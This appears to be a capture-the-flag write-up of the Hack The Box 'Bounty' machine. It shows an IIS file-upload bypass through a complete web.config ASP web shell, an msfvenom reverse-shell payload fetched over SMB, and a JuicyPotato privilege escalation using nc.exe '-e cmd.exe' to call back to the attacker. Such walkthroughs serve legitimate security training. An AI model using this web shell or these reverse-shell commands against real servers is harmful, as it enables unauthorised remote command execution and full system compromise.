---
description: https://app.hackthebox.com/machines/Bounty
---

# Bounty

## Nmap

```
sudo nmap 10.10.10.93 -p- -sS -sV

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Server

Browsing to the hosted web server we are greeted with an image of a wizard.

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

### Directory Brute Forcing

As there is nothing else to obtain from this page, even after checking the page source we can move on to directory brute forcing with `feroxbuster`.

Using the large files word list from `seclists` we discover the existence of `transfer.aspx`.

```
feroxbuster -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt 
```

<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

Browsing to the `transfer.aspx` page we are given a opportunity to select a file for upload.

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

### File Upload - Web Shell

Going straight in and attempting to upload an `.aspx` reverse shell we see through `Burpsuite` that we are given an error due to an invalid file.

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

In order to discover allowed file types I sent the request to Intruder and fuzzed the `.aspx` extension with a list of most common extensions.

Once completed sorting the results by length we see that responses with a length of 1350 indicate file upload was successful.

<figure><img src="../../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>

Most interesting  from the results is the `.config` file extension. This can be used against IIS servers for gaining web shells and reverse shells under the right circumstances.

The blog post linked below covers various ways of exploiting this:

**URL:** [https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

We are going to use a web shell as shown below. Save the contents in a file called `web.config`.

**Web.config Web Shell:** [https://github.com/tennc/webshell/blob/master/aspx/web.config](https://github.com/tennc/webshell/blob/master/aspx/web.config)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.Write("-"&"->")
Function GetCommandOutput(command)
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec(command)
    GetCommandOutput = exec.StdOut.ReadAll
End Function
Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))
Response.Write("<!-"&"-")
%>
-->
```

After saving the contents upload the web.config file to the target system. After uploading we see through the response in `Burpsuite` that the file upload was successful.

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

After uploading the file we still need to discover where to access it from. Using `feroxbuster` again with a different directory word list we soon discover the directory `/UploadedFiles/`.

<figure><img src="../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Using Burpsuite we sent a GET request to [`http://10.10.10.93/UploadedFiles/web.config?cmd=whoami`](http://10.10.10.93/UploadedFiles/web.config?cmd=whoami). Where we have append the command we wish to run.

Looking at the response, we see we are executing commands in the context of the user merlin.

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

### A Better Shell

We can now use the web shell to gain a proper shell.

<pre class="language-bash"><code class="lang-bash"><strong># Set up SMB server on attacking system
</strong><strong>smbserver.py -smb2support Share ~/bounty
</strong>
# Create reverse shell in same directory
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o reverse.exe
</code></pre>

After setting up as per the above commands use the web shell to execute the `msfvenom` payload.

<figure><img src="../../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

Where out `netcat` listener should catch the shell.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### User Flag

Moving into merlin's Desktop directory we notice initially that it is empty. Running the command `dir /a` shows reveals hidden files, where we can now grab the `user.txt` flag.

<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

Moving onto privilege escalation we perform the basics by checking our current user privileges with `whoami /priv`.

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

With the privilege `SeImpersonatePrivilege` we may be able to perform a [JuicyPotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato) attack to escalate privileges depending on the operating system version.

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

In order to identify the correct CLSID to use we can either painstakingly guess or we can use a batch script to test for each possibility.&#x20;

Download the files below:

**Windows Server 2008 R2 Datacenter CLSID:** [https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows\_Server\_2008\_R2\_Enterprise/CLSID.list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows\_Server\_2008\_R2\_Enterprise/CLSID.list)

**test\_clsid.bat:** [https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)

**JuicyPotato.exe:** [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

Place them in the specified folder for the SMB server we set up earlier and then on the target system copy them over.

```
copy \\10.10.14.6\Share\test_clsid.bat test_clsid.bat
copy \\10.10.14.6\Share\CLSID.list CLSID.list
copy \\10.10.14.6\Share\JuicyPotato.exe JuicyPotato.exe
```

Once downloaded run the batch file.

```
test_clsid.bat
```

This will test all possible CLSID's for Windows Server 2008.

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Once completed we can check the result.log file for CLSID's which will work. From here make a note of any that are running under SYSTEM.

<figure><img src="../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

To stage that attack we also need a copy of `nc.exe` on the target system. Again, place the file on our `SMB` share and copy the binary over.

Copy over `nc.exe`.

```
copy \\10.10.14.6\Share\nc.exe nc.exe
```

From here build the attack to call back to  a listening ports on the attacking system.&#x20;

```
juicypotato.exe -l 1234 -p nc.exe -a " -nv 10.10.14.6 4455 -e cmd.exe" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
```

* \-l : Create a listening port
* \-p: Program to launch
* \-a: use the following arguments
* \-t: createprocess call: CreateProcessWithTokenW, CreateProcessAsUser, <\*> try both
* \-c: {CLSID}

After running the command we should be given confirmation as shown below:

<figure><img src="../../../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

As well as receiving a **SYSTEM** shell on our listener.

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

### Root Flag

From here we are able to retrieve the `root.txt` flag.

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
